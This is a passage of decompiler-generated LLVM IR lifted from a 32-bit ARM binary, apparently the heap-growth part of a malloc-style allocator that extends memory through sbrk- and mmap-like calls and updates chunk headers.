  store i32 %v0_115d4, i32* %v3_115d4, align 4
  %v0_115d8 = load i32, i32* %ip.global-to-local, align 4
  %v1_115d8 = add i32 %v0_115d8, 868
  %v2_115d8 = inttoptr i32 %v1_115d8 to i32*
  %v3_115d8 = load i32, i32* %v2_115d8, align 4
  store i32 %v3_115d8, i32* %r3.global-to-local, align 4
  %v1_115dc = add i32 %v0_115d8, 880
  %v2_115dc = inttoptr i32 %v1_115dc to i32*
  %v3_115dc = load i32, i32* %v2_115dc, align 4
  store i32 %v3_115dc, i32* %r2.global-to-local, align 4
  %v0_115e0 = load i32, i32* @r4, align 4
  %v2_115e0 = add i32 %v0_115e0, %v3_115d8
  store i32 %v2_115e0, i32* %r1.global-to-local, align 4
  %v1_115e4 = add i32 %v0_115d8, 872
  %v2_115e4 = inttoptr i32 %v1_115e4 to i32*
  %v3_115e4 = load i32, i32* %v2_115e4, align 4
  store i32 %v3_115e4, i32* %r3.global-to-local, align 4
  %v1_115ec = add i32 %v0_115d8, 884
  %v2_115ec = inttoptr i32 %v1_115ec to i32*
  %v3_115ec = load i32, i32* %v2_115ec, align 4
  store i32 %v3_115ec, i32* %r2.global-to-local, align 4
  %tmp212 = icmp ugt i32 %v2_115e0, %v3_115dc
  br i1 %tmp212, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 %v2_115e0, i32* %v2_115dc, align 4
  %v0_115f4.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_115f4.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v1_115f4 = phi i32 [ %v0_115d8, %bb148 ], [ %v1_115f4.pre, %bb149 ]
  %v0_115f4 = phi i32 [ %v2_115e0, %bb148 ], [ %v0_115f4.pre, %bb149 ]
  %v2_115f4 = add i32 %v1_115f4, 868
  %v3_115f4 = inttoptr i32 %v2_115f4 to i32*
  store i32 %v0_115f4, i32* %v3_115f4, align 4
  %v0_115f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_115f8 = load i32, i32* %r3.global-to-local, align 4
  %v2_115f8 = add i32 %v1_115f8, %v0_115f8
  store i32 %v2_115f8, i32* %r1.global-to-local, align 4
  %v1_115fc = load i32, i32* %r2.global-to-local, align 4
  %v0_11600 = load i32, i32* %lr.global-to-local, align 4
  %v1_11600 = add i32 %v0_11600, 8
  store i32 %v1_11600, i32* %r0.global-to-local, align 4
  %tmp213 = icmp ugt i32 %v2_115f8, %v1_115fc
  br i1 %tmp213, label %bb151, label %dec_label_pc_1190c

bb151:                                            ; preds = %bb150
  %v5_11604 = load i32, i32* %ip.global-to-local, align 4
  %v6_11604 = add i32 %v5_11604, 884
  %v7_11604 = inttoptr i32 %v6_11604 to i32*
  store i32 %v2_115f8, i32* %v7_11604, align 4
  br label %dec_label_pc_1190c

dec_label_pc_1160c:                               ; preds = %dec_label_pc_11550, %dec_label_pc_11530, %dec_label_pc_11564.dec_label_pc_1160c_crit_edge, %dec_label_pc_11540
  %v1_11630 = phi i32 [ %v1_11630.pre, %dec_label_pc_11564.dec_label_pc_1160c_crit_edge ], [ %v0_114d8, %dec_label_pc_11540 ], [ %v0_114d8, %dec_label_pc_11530 ], [ %v0_114d8, %dec_label_pc_11550 ]
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 123764, i32* %ip.global-to-local, align 4
  %v4_11614 = load i32, i32* inttoptr (i32 123796 to i32*), align 4
  store i32 %v4_11614, i32* %r3.global-to-local, align 4
  %v1_11618 = add i32 %v4_11614, 44
  %v2_11618 = inttoptr i32 %v1_11618 to i32*
  %v3_11618 = load i32, i32* %v2_11618, align 4
  store i32 %v3_11618, i32* %r0.global-to-local, align 4
  %v1_1161c = add i32 %v4_11614, 864
  %v2_1161c = inttoptr i32 %v1_1161c to i32*
  %v3_1161c = load i32, i32* %v2_1161c, align 4
  store i32 %v3_1161c, i32* %r2.global-to-local, align 4
  %v1_11620 = add i32 %v4_11614, 840
  %v2_11620 = inttoptr i32 %v1_11620 to i32*
  %v3_11620 = load i32, i32* %v2_11620, align 4
  store i32 %v3_11620, i32* %r3.global-to-local, align 4
  %v1_11624 = add i32 %v3_11618, 4
  %v2_11624 = inttoptr i32 %v1_11624 to i32*
  %v3_11624 = load i32, i32* %v2_11624, align 4
  store i32 %v3_11624, i32* %r1.global-to-local, align 4
  %v1_1162c = urem i32 %v3_1161c, 2
  %v2_1162c = icmp eq i32 %v1_1162c, 0
  %v1_11628 = add i32 %v1_11630, 16
  %v2_11630 = add i32 %v1_11628, %v3_11620
  store i32 %v2_11630, i32* %r3.global-to-local, align 4
  %v1_11634 = and i32 %v3_11624, -4
  store i32 %v1_11634, i32* @r8, align 4
  br i1 %v2_1162c, label %bb153, label %bb152

bb152:                                            ; preds = %dec_label_pc_1160c
  %v3_11638 = sub i32 %v2_11630, %v1_11634
  store i32 %v3_11638, i32* %r3.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %dec_label_pc_1160c, %bb152
  %v0_1163c = phi i32 [ %v2_11630, %dec_label_pc_1160c ], [ %v3_11638, %bb152 ]
  %v1_1163c = load i32, i32* %sb.global-to-local, align 4
  %v2_1163c = add i32 %v1_1163c, %v0_1163c
  store i32 %v2_1163c, i32* %r3.global-to-local, align 4
  %v1_11640 = sub i32 -1, %v1_1163c
  store i32 %v1_11640, i32* %fp.global-to-local, align 4
  %v2_11644 = and i32 %v2_1163c, %v1_11640
  store i32 %v2_11644, i32* @r5, align 4
  %tmp154 = icmp slt i32 %v2_11644, 1
  br i1 %tmp154, label %dec_label_pc_11668, label %dec_label_pc_11654

dec_label_pc_11654:                               ; preds = %bb153
  store i32 %v2_11644, i32* %r0.global-to-local, align 4
  %v1_11658 = call i32 @function_135ac(i32 %v2_11644)
  store i32 %v1_11658, i32* %r0.global-to-local, align 4
  %v3_1165c = icmp eq i32 %v1_11658, -1
  store i32 %v1_11658, i32* @r4, align 4
  br i1 %v3_1165c, label %dec_label_pc_11668, label %dec_label_pc_116d4

dec_label_pc_11668:                               ; preds = %dec_label_pc_11654, %bb153
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 123764, i32* %r1.global-to-local, align 4
  %v4_11670 = load i32, i32* inttoptr (i32 123796 to i32*), align 4
  store i32 %v4_11670, i32* %r6.global-to-local, align 4
  %v1_11674 = add i32 %v4_11670, 864
  %v2_11674 = inttoptr i32 %v1_11674 to i32*
  %v3_11674 = load i32, i32* %v2_11674, align 4
  store i32 %v3_11674, i32* %r3.global-to-local, align 4
  %v1_11678 = urem i32 %v3_11674, 2
  %v2_11678 = icmp eq i32 %v1_11678, 0
  br i1 %v2_11678, label %.thread29thread-pre-split, label %bb155

bb155:                                            ; preds = %dec_label_pc_11668
  %v1_1167c = load i32, i32* @r8, align 4
  %v2_1167c = load i32, i32* %sb.global-to-local, align 4
  %v3_1167c = add i32 %v2_1167c, %v1_1167c
  %v2_11680 = load i32, i32* @r5, align 4
  %v3_11680 = add i32 %v3_1167c, %v2_11680
  store i32 %v3_11680, i32* %r3.global-to-local, align 4
  %v2_11684 = load i32, i32* %fp.global-to-local, align 4
  %v3_11684 = and i32 %v2_11684, %v3_11680
  store i32 %v3_11684, i32* @r5, align 4
  br label %.thread29

.thread29thread-pre-split:                        ; preds = %dec_label_pc_11668
  %v0_11688.pr = load i32, i32* @r5, align 4
  br label %.thread29

.thread29:                                        ; preds = %.thread29thread-pre-split, %bb155
  %v0_11688 = phi i32 [ %v0_11688.pr, %.thread29thread-pre-split ], [ %v3_11684, %bb155 ]
  %v2_11688 = icmp ugt i32 %v0_11688, 1048575
  br i1 %v2_11688, label %bb157, label %bb156

bb156:                                            ; preds = %.thread29
  store i32 1048576, i32* @r5, align 4
  br label %bb157

bb157:                                            ; preds = %.thread29, %bb156
  %v0_116a0 = phi i32 [ %v0_11688, %.thread29 ], [ 1048576, %bb156 ]
  %v1_11690 = load i32, i32* @sl, align 4
  %tmp214 = icmp ugt i32 %v0_116a0, %v1_11690
  br i1 %tmp214, label %dec_label_pc_11698, label %dec_label_pc_118fc

dec_label_pc_11698:                               ; preds = %bb157
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_116a0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_116b4 = call i32 @function_13320(i32 0, i32 %v0_116a0, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_116b4, i32* %r0.global-to-local, align 4
  %v3_116b8 = icmp eq i32 %v6_116b4, -1
  %v8_116b8 = icmp eq i32 %v6_116b4, -1
  store i32 %v6_116b4, i32* @r4, align 4
  br i1 %v8_116b8, label %.thread32, label %bb158

bb158:                                            ; preds = %dec_label_pc_11698
  %v1_116c0 = load i32, i32* %r6.global-to-local, align 4
  %v2_116c0 = add i32 %v1_116c0, 864
  %v3_116c0 = inttoptr i32 %v2_116c0 to i32*
  %v4_116c0 = load i32, i32* %v3_116c0, align 4
  %v2_116c4 = load i32, i32* @r5, align 4
  %v3_116c4 = add i32 %v2_116c4, %v6_116b4
  store i32 %v3_116c4, i32* %r0.global-to-local, align 4
  %v2_116c8 = and i32 %v4_116c0, -2
  store i32 %v2_116c8, i32* %r3.global-to-local, align 4
  store i32 %v2_116c8, i32* %v3_116c0, align 4
  br label %.thread32

.thread32:                                        ; preds = %dec_label_pc_11698, %bb158
  br i1 %v3_116b8, label %dec_label_pc_116d4, label %dec_label_pc_116d8

dec_label_pc_116d4:                               ; preds = %.thread32, %dec_label_pc_11654
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_116d8

dec_label_pc_116d8:                               ; preds = %.thread32, %dec_label_pc_116d4
  %v0_116d8 = load i32, i32* @r4, align 4
  %v7_116d8 = icmp eq i32 %v0_116d8, -1
  br i1 %v7_116d8, label %dec_label_pc_118fc, label %dec_label_pc_116e0

dec_label_pc_116e0:                               ; preds = %dec_label_pc_116d8
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 123764, i32* %r2.global-to-local, align 4
  %v4_116e8 = load i32, i32* inttoptr (i32 123796 to i32*), align 4
  store i32 %v4_116e8, i32* %ip.global-to-local, align 4
  store i32 %v3_11618, i32* %r2.global-to-local, align 4
  %v1_116f0 = add i32 %v4_116e8, 872
  %v2_116f0 = inttoptr i32 %v1_116f0 to i32*
  %v3_116f0 = load i32, i32* %v2_116f0, align 4
  %v1_116f4 = load i32, i32* @r8, align 4
  %v2_116f4 = add i32 %v1_116f4, %v3_11618
  store i32 %v2_116f4, i32* %r1.global-to-local, align 4
  %v0_116f8 = load i32, i32* @r5, align 4
  %v2_116f8 = add i32 %v0_116f8, %v3_116f0
  store i32 %v2_116f8, i32* %r3.global-to-local, align 4
  %v9_116fc = icmp eq i32 %v0_116d8, %v2_116f4
  br i1 %v9_116fc, label %bb159, label %.thread122

.thread122:                                       ; preds = %dec_label_pc_116e0
  store i32 %v2_116f8, i32* %v2_116f0, align 4
  br label %dec_label_pc_11718

bb159:                                            ; preds = %dec_label_pc_116e0
  %v1_11700 = load i32, i32* %r0.global-to-local, align 4
  %v8_11700 = icmp eq i32 %v1_11700, -1
  store i32 %v2_116f8, i32* %v2_116f0, align 4
  br i1 %v8_11700, label %.thread34, label %dec_label_pc_11718

.thread34:                                        ; preds = %bb159
  %v1_11708 = load i32, i32* @r5, align 4
  %v2_11708 = load i32, i32* @r8, align 4
  %v3_11708 = add i32 %v2_11708, %v1_11708
  %v2_1170c = or i32 %v3_11708, 1
  store i32 %v2_1170c, i32* %r3.global-to-local, align 4
  %v2_11710 = load i32, i32* %r2.global-to-local, align 4
  %v3_11710 = add i32 %v2_11710, 4
  %v4_11710 = inttoptr i32 %v3_11710 to i32*
  store i32 %v2_1170c, i32* %v4_11710, align 4
  br label %dec_label_pc_11890

dec_label_pc_11718:                               ; preds = %bb159, %.thread122
  %v0_1171c.pr = load i32, i32* @r8, align 4
  %v0_11718 = load i32, i32* %ip.global-to-local, align 4
  %v1_11718 = add i32 %v0_11718, 864
  %v2_11718 = inttoptr i32 %v1_11718 to i32*
  %v3_11718 = load i32, i32* %v2_11718, align 4
  store i32 %v3_11718, i32* %r2.global-to-local, align 4
  %v2_1171c = icmp eq i32 %v0_1171c.pr, 0
  br i1 %v2_1171c, label %.thread37, label %.thread36

.thread37:                                        ; preds = %dec_label_pc_11718
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread40

.thread36:                                        ; preds = %dec_label_pc_11718
  %v2_11724 = urem i32 %v3_11718, 2
  store i32 %v2_11724, i32* %r3.global-to-local, align 4
  %v2_11728 = icmp eq i32 %v2_11724, 0
  br i1 %v2_11728, label %.thread40, label %dec_label_pc_11730

dec_label_pc_11730:                               ; preds = %.thread36
  %v0_11730 = load i32, i32* @r4, align 4
  %v1_11730 = load i32, i32* %r1.global-to-local, align 4
  %v3_11730 = icmp ult i32 %v0_11730, %v1_11730
  br i1 %v3_11730, label %bb160, label %.thread40

bb160:                                            ; preds = %dec_label_pc_11730
  %v2_11734 = and i32 %v3_11718, -2
  store i32 %v2_11734, i32* %r3.global-to-local, align 4
  store i32 %v2_11734, i32* %v2_11718, align 4
  br label %.thread40

.thread40:                                        ; preds = %dec_label_pc_11730, %.thread37, %.thread36, %bb160
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 123764, i32* %ip.global-to-local, align 4
  %v4_11744 = load i32, i32* inttoptr (i32 123796 to i32*), align 4
  store i32 %v4_11744, i32* @r7, align 4
  %v1_11748 = add i32 %v4_11744, 864
  %v2_11748 = inttoptr i32 %v1_11748 to i32*
  %v3_11748 = load i32, i32* %v2_11748, align 4
  store i32 %v3_11748, i32* %r3.global-to-local, align 4
  %v1_1174c = urem i32 %v3_11748, 2
  store i32 %v1_1174c, i32* @r6, align 4
  %v2_1174c = icmp eq i32 %v1_1174c, 0
  br i1 %v2_1174c, label %dec_label_pc_117e0, label %dec_label_pc_11754

dec_label_pc_11754:                               ; preds = %.thread40
  %v0_11754 = load i32, i32* @r8, align 4
  %v2_11754 = icmp eq i32 %v0_11754, 0
  br i1 %v2_11754, label %.thread43, label %bb161

bb161:                                            ; preds = %dec_label_pc_11754
  %v2_11758 = add i32 %v4_11744, 872
  %v3_11758 = inttoptr i32 %v2_11758 to i32*
  %v4_11758 = load i32, i32* %v3_11758, align 4
  store i32 %v4_11758, i32* %r2.global-to-local, align 4
  %v1_1175c = load i32, i32* %r1.global-to-local, align 4
  %v2_1175c = load i32, i32* @r4, align 4
  %v3_1175c = sub i32 %v2_1175c, %v1_1175c
  %v3_11760 = add i32 %v3_1175c, %v4_11758
  store i32 %v3_11760, i32* %r3.global-to-local, align 4
  store i32 %v3_11760, i32* %v3_11758, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_11754, %bb161
  %v0_11768 = load i32, i32* @r4, align 4
  %v1_11768 = urem i32 %v0_11768, 8
  store i32 %v1_11768, i32* %r3.global-to-local, align 4
  %v2_11768 = icmp eq i32 %v1_11768, 0
  br i1 %v2_11768, label %.thread44, label %bb162

bb162:                                            ; preds = %.thread43
  %v2_1176c = sub nsw i32 8, %v1_11768
  store i32 %v2_1176c, i32* %r3.global-to-local, align 4
  %v3_11770 = add i32 %v2_1176c, %v0_11768
  store i32 %v3_11770, i32* @r7, align 4
  br label %.thread44

.thread44:                                        ; preds = %.thread43, %bb162
  %v0_11778 = phi i32 [ 0, %.thread43 ], [ %v2_1176c, %bb162 ]
  %v1_11774 = load i32, i32* @r5, align 4
  %v2_11774 = add i32 %v1_11774, %v0_11768
  store i32 %v2_11774, i32* @r6, align 4
  %v1_11778 = load i32, i32* @r8, align 4
  %v2_11778 = add i32 %v2_11774, %v0_11778
  %v2_1177c = add i32 %v2_11778, %v1_11778
  store i32 %v2_1177c, i32* %r1.global-to-local, align 4
  %v1_11780 = load i32, i32* %sb.global-to-local, align 4
  %v2_11780 = add i32 %v1_11780, %v2_1177c
  %v1_11784 = load i32, i32* %fp.global-to-local, align 4
  %v2_11784 = and i32 %v1_11784, %v2_11780
  store i32 %v2_11784, i32* %r2.global-to-local, align 4
  %v2_11788 = sub i32 0, %v2_11774
  store i32 %v2_11788, i32* %r3.global-to-local, align 4
  %v2_1178c = sub i32 %v2_11784, %v2_11774
  store i32 %v2_1178c, i32* @r5, align 4
  store i32 %v2_1178c, i32* %r0.global-to-local, align 4
  br i1 %v2_11768, label %bb163, label %bb164

bb163:                                            ; preds = %.thread44
  store i32 %v0_11768, i32* @r7, align 4
  br label %bb164

bb164:                                            ; preds = %.thread44, %bb163
  %v1_11798 = call i32 @function_135ac(i32 %v2_1178c)
  store i32 %v1_11798, i32* %r0.global-to-local, align 4
  %v3_1179c = icmp eq i32 %v1_11798, -1
  br i1 %v3_1179c, label %dec_label_pc_117a4, label %dec_label_pc_117b4

dec_label_pc_117a4:                               ; preds = %bb164
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_117a8 = call i32 @function_135ac(i32 0)
  store i32 %v1_117a8, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_1180c

dec_label_pc_117b4:                               ; preds = %bb164
  %v1_117b4 = load i32, i32* @r4, align 4
  %v3_117b4 = icmp ult i32 %v1_11798, %v1_117b4
  br i1 %v3_117b4, label %dec_label_pc_117bc, label %dec_label_pc_1180c

dec_label_pc_117bc:                               ; preds = %dec_label_pc_117b4
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 123764, i32* %r0.global-to-local, align 4
  %v4_117c4 = load i32, i32* inttoptr (i32 123796 to i32*), align 4
  store i32 %v4_117c4, i32* %r2.global-to-local, align 4
  %v1_117c8 = add i32 %v4_117c4, 864
  %v2_117c8 = inttoptr i32 %v1_117c8 to i32*
  %v3_117c8 = load i32, i32* %v2_117c8, align 4
  %v0_117cc = load i32, i32* @r6, align 4
  store i32 %v0_117cc, i32* %r0.global-to-local, align 4
  %v1_117d0 = and i32 %v3_117c8, -2
  store i32 %v1_117d0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_117d0, i32* %v2_117c8, align 4
  br label %dec_label_pc_1180c

dec_label_pc_117e0:                               ; preds = %.thread40
  %v0_117e0 = load i32, i32* %r0.global-to-local, align 4
  %v3_117e0 = icmp eq i32 %v0_117e0, -1
  br i1 %v3_117e0, label %dec_label_pc_117e8, label %dec_label_pc_11804

dec_label_pc_117e8:                               ; preds = %dec_label_pc_117e0
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_117ec = call i32 @function_135ac(i32 0)
  store i32 %v1_117ec, i32* %r0.global-to-local, align 4
  %v0_117f0 = load i32, i32* @r7, align 4
  %v1_117f0 = add i32 %v0_117f0, 872
  %v2_117f0 = inttoptr i32 %v1_117f0 to i32*
  %v3_117f0 = load i32, i32* %v2_117f0, align 4
  store i32 %v3_117f0, i32* %r2.global-to-local, align 4
  %v0_117f4 = load i32, i32* @r4, align 4
  %v0_117f8 = load i32, i32* @r5, align 4
  %v2_117f4 = add i32 %v3_117f0, %v1_117ec
  %v2_117f8 = sub i32 %v2_117f4, %v0_117f4
  %v2_117fc = sub i32 %v2_117f8, %v0_117f8
  store i32 %v2_117fc, i32* %r3.global-to-local, align 4
  store i32 %v2_117fc, i32* %v2_117f0, align 4
  %v0_11808.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_11804

dec_label_pc_11804:                               ; preds = %dec_label_pc_117e0, %dec_label_pc_117e8
  %v0_11808 = phi i32 [ 0, %dec_label_pc_117e0 ], [ %v0_11808.pre, %dec_label_pc_117e8 ]
  %v0_11804 = load i32, i32* @r4, align 4
  store i32 %v0_11804, i32* @r7, align 4
  store i32 %v0_11808, i32* @r5, align 4
  br label %dec_label_pc_1180c

dec_label_pc_1180c:                               ; preds = %dec_label_pc_117b4, %dec_label_pc_117bc, %dec_label_pc_117a4, %dec_label_pc_11804
  %v0_1180c = load i32, i32* %r0.global-to-local, align 4
  %v7_1180c = icmp eq i32 %v0_1180c, -1
  br i1 %v7_1180c, label %dec_label_pc_11890, label %dec_label_pc_11814

dec_label_pc_11814:                               ; preds = %dec_label_pc_1180c
  %v1_11814 = load i32, i32* @r5, align 4
  %v2_11814 = add i32 %v1_11814, %v0_1180c
  %v0_11818 = load i32, i32* @r7, align 4
  %v2_11818 = sub i32 %v2_11814, %v0_11818
  %v1_1181c = or i32 %v2_11818, 1
  %v2_11820 = add i32 %v0_11818, 4
  %v3_11820 = inttoptr i32 %v2_11820 to i32*
  store i32 %v1_1181c, i32* %v3_11820, align 4
  store i32 123764, i32* %r1.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_1182c = load i32, i32* inttoptr (i32 123796 to i32*), align 4
  store i32 %v4_1182c, i32* @r6, align 4
  %v1_11830 = add i32 %v4_1182c, 872
  %v2_11830 = inttoptr i32 %v1_11830 to i32*
  %v3_11830 = load i32, i32* %v2_11830, align 4
  %v0_11834 = load i32, i32* @r8, align 4
  %v2_11834 = icmp eq i32 %v0_11834, 0
  %v0_11838 = load i32, i32* @r5, align 4
  %v2_11838 = add i32 %v0_11838, %v3_11830
  store i32 %v2_11838, i32* %r3.global-to-local, align 4
  store i32 %v2_11838, i32* %v2_11830, align 4
  %v0_11840 = load i32, i32* @r7, align 4
  %v1_11840 = load i32, i32* @r6, align 4
  %v2_11840 = add i32 %v1_11840, 44
  %v3_11840 = inttoptr i32 %v2_11840 to i32*
  store i32 %v0_11840, i32* %v3_11840, align 4
  br i1 %v2_11834, label %dec_label_pc_11890, label %dec_label_pc_11848

dec_label_pc_11848:                               ; preds = %dec_label_pc_11814
  %v0_1184c = load i32, i32* @r8, align 4
  %v1_1184c = add i32 %v0_1184c, -12
  %v1_11850 = and i32 %v1_1184c, -8
  store i32 %v3_11618, i32* %ip.global-to-local, align 4
  %v2_11858 = add i32 %v1_11850, %v3_11618
  store i32 %v2_11858, i32* %r1.global-to-local, align 4
  %v2_1185c = icmp ugt i32 %v1_11850, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_11864 = or i32 %v1_11850, 1
  store i32 %v1_11864, i32* %r3.global-to-local, align 4
  store i32 %v1_11864, i32* %v2_11624, align 4
  %v0_1186c = load i32, i32* %r2.global-to-local, align 4
  %v1_1186c = load i32, i32* %r1.global-to-local, align 4
  %v2_1186c = add i32 %v1_1186c, 8
  %v3_1186c = inttoptr i32 %v2_1186c to i32*
  store i32 %v0_1186c, i32* %v3_1186c, align 4
  %v0_11870 = load i32, i32* %r2.global-to-local, align 4
  %v1_11870 = load i32, i32* %r1.global-to-local, align 4
  %v2_11870 = add i32 %v1_11870, 4
  %v3_11870 = inttoptr i32 %v2_11870 to i32*
  store i32 %v0_11870, i32* %v3_11870, align 4
  br i1 %v2_1185c, label %dec_label_pc_11878, label %dec_label_pc_11890

dec_label_pc_11878:                               ; preds = %dec_label_pc_11848
  %v0_11878 = load i32, i32* @r6, align 4
  %v1_11878 = add i32 %v0_11878, 836
  %v2_11878 = inttoptr i32 %v1_11878 to i32*
  %v3_11878 = load i32, i32* %v2_11878, align 4
  store i32 %v3_11878, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_11880 = load i32, i32* %ip.global-to-local, align 4
  %v1_11880 = add i32 %v0_11880, 8
  store i32 %v1_11880, i32* @r0, align 4
  store i32 -1, i32* %v2_11878, align 4
  %v0_11888 = call i32 @function_120a4()
  store i32 %v0_11888, i32* %r0.global-to-local, align 4
  %v0_1188c = load i32, i32* @r4, align 4
  %v1_1188c = load i32, i32* @r6, align 4
  %v2_1188c = add i32 %v1_1188c, 836
  %v3_1188c = inttoptr i32 %v2_1188c to i32*
  store i32 %v0_1188c, i32* %v3_1188c, align 4
  br label %dec_label_pc_11890

dec_label_pc_11890:                               ; preds = %.thread34, %dec_label_pc_11848, %dec_label_pc_11814, %dec_label_pc_1180c, %dec_label_pc_11878
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 123764, i32* %r0.global-to-local, align 4
  %v4_11898 = load i32, i32* inttoptr (i32 123796 to i32*), align 4
  store i32 %v4_11898, i32* %lr.global-to-local, align 4
  %v1_1189c = add i32 %v4_11898, 872
  store i32 %v1_1189c, i32* %r1.global-to-local, align 4
  %v1_118a0 = inttoptr i32 %v1_1189c to i32*
  %v2_118a0 = load i32, i32* %v1_118a0, align 4
  store i32 %v2_118a0, i32* %r1.global-to-local, align 4
  %v3_118a0 = add i32 %v4_11898, 876
  %v4_118a0 = inttoptr i32 %v3_118a0 to i32*
  %v5_118a0 = load i32, i32* %v4_118a0, align 4
  store i32 %v5_118a0, i32* %r3.global-to-local, align 4
  %v1_118a8 = add i32 %v4_11898, 868
  %v2_118a8 = inttoptr i32 %v1_118a8 to i32*
  %v3_118a8 = load i32, i32* %v2_118a8, align 4
  store i32 %v3_118a8, i32* %r3.global-to-local, align 4
  %v1_118ac = add i32 %v4_11898, 884
  %v2_118ac = inttoptr i32 %v1_118ac to i32*
  %v3_118ac = load i32, i32* %v2_118ac, align 4
  store i32 %v3_118ac, i32* %r2.global-to-local, align 4
  %v2_118b0 = add i32 %v3_118a8, %v2_118a0
  store i32 %v2_118b0, i32* %r3.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_118a0, %v5_118a0
  br i1 %tmp215, label %bb165, label %bb166

bb165:                                            ; preds = %dec_label_pc_11890
  store i32 %v2_118a0, i32* %v4_118a0, align 4
  %v0_118b8.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_118b8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb166

bb166:                                            ; preds = %dec_label_pc_11890, %bb165
  %v1_118b8 = phi i32 [ %v3_118ac, %dec_label_pc_11890 ], [ %v1_118b8.pre, %bb165 ]
  %v4_118bc = phi i32 [ %v2_118b0, %dec_label_pc_11890 ], [ %v0_118b8.pre, %bb165 ]
  %tmp216 = icmp ugt i32 %v4_118bc, %v1_118b8
  br i1 %tmp216, label %bb167, label %bb168

bb167:                                            ; preds = %bb166
  %v5_118bc = load i32, i32* %lr.global-to-local, align 4
  %v6_118bc = add i32 %v5_118bc, 884
  %v7_118bc = inttoptr i32 %v6_118bc to i32*
  store i32 %v4_118bc, i32* %v7_118bc, align 4
  br label %bb168

bb168:                                            ; preds = %bb166, %bb167
  %v0_118c0 = load i32, i32* %lr.global-to-local, align 4
  %v1_118c0 = add i32 %v0_118c0, 44
  %v2_118c0 = inttoptr i32 %v1_118c0 to i32*
  %v3_118c0 = load i32, i32* %v2_118c0, align 4
  store i32 %v3_118c0, i32* %ip.global-to-local, align 4
  %v1_118c4 = add i32 %v3_118c0, 4
  %v2_118c4 = inttoptr i32 %v1_118c4 to i32*
  %v3_118c4 = load i32, i32* %v2_118c4, align 4
  store i32 %v1_114d8, i32* %r1.global-to-local, align 4
  %v1_118cc = and i32 %v3_118c4, -4
  store i32 %v1_118cc, i32* %r3.global-to-local, align 4
  %v3_118d0 = icmp ult i32 %v1_118cc, %v1_114d8
  br i1 %v3_118d0, label %dec_label_pc_118fc, label %dec_label_pc_118d8

dec_label_pc_118d8:                               ; preds = %bb168
  %v0_118d8 = load i32, i32* @sl, align 4
  %v2_118d8 = sub i32 %v1_118cc, %v0_118d8
  %v2_118dc = add i32 %v0_118d8, %v3_118c0
  store i32 %v2_118dc, i32* %r1.global-to-local, align 4
  %v1_118e0 = or i32 %v2_118d8, 1
  store i32 %v1_118e0, i32* %r3.global-to-local, align 4
  %v1_118e4 = or i32 %v0_118d8, 1
  store i32 %v1_118e4, i32* %r2.global-to-local, align 4
  %v1_118e8 = add i32 %v3_118c0, 8
  store i32 %v1_118e8, i32* %r0.global-to-local, align 4
  store i32 %v1_118e4, i32* %v2_118c4, align 4
  %v0_118f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_118f0 = load i32, i32* %lr.global-to-local, align 4
  %v2_118f0 = add i32 %v1_118f0, 44
  %v3_118f0 = inttoptr i32 %v2_118f0 to i32*
  store i32 %v0_118f0, i32* %v3_118f0, align 4
  %v0_118f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_118f4 = load i32, i32* %r1.global-to-local, align 4
  %v2_118f4 = add i32 %v1_118f4, 4
  %v3_118f4 = inttoptr i32 %v2_118f4 to i32*
  store i32 %v0_118f4, i32* %v3_118f4, align 4
  br label %dec_label_pc_1190c

dec_label_pc_118fc:                               ; preds = %bb157, %bb168, %dec_label_pc_116d8
  %v0_118fc = call i32 @function_10a30()
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_11904 = inttoptr i32 %v0_118fc to i32*
  store i32 12, i32* %v2_11904, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1190c

dec_label_pc_1190c:                               ; preds = %bb151, %bb150, %dec_label_pc_118d8, %dec_label_pc_11520, %dec_label_pc_118fc
  %v0_1190c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1190c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11910

dec_label_pc_11910:                               ; preds = %.thread1, %dec_label_pc_114ec, %.thread121, %dec_label_pc_1135c, %dec_label_pc_11350, %dec_label_pc_111b8, %dec_label_pc_1113c, %dec_label_pc_1190c
  store i32 %v2_11064, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* @r3, align 4
  store i32 123764, i32* %r2.global-to-local, align 4
  %v4_11920 = load i32, i32* inttoptr (i32 123788 to i32*), align 4
  store i32 %v4_11920, i32* @ip, align 4
  store i32 71980, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_11920)
  br label %dec_label_pc_1192c

dec_label_pc_1192c:                               ; preds = %dec_label_pc_1109c, %dec_label_pc_11910
